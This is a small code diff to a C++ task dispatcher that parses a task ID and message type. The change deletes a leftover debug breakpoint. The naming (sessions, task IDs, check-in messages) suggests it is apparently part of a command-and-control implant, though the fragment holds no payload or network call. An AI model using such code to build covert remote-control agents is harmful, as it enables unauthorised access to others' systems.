@@ -206,9 +206,7 @@ namespace Dispatcher {
         Parser::UnpackDword(&parser);
 
         auto task_id = Parser::UnpackDword(&parser);
-
         x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));
-        __debugbreak();
 
         switch (Parser::UnpackDword(&parser)) {
             case TypeCheckin:
